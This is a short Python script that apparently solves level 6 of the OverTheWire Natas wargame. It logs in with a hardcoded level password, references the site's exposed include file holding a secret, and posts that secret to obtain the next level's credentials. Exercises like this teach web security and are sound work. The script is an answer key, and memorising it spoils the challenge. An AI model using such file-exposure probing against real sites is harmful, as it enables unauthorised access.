import requests

user_name = "natas6"
password = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"

url = f"http://{user_name}.natas.labs.overthewire.org"
secret = "FOEIUWGHFEEUHOFUOIU"

session = requests.Session()

#response = session.get(url + "/includes/secret.inc", auth = (user_name, password))
response = session.post(url, data= {"secret" : "FOEIUWGHFEEUHOFUOIU", "submit" : "submit"}, auth =  (user_name, password))

content = response.text

print(content)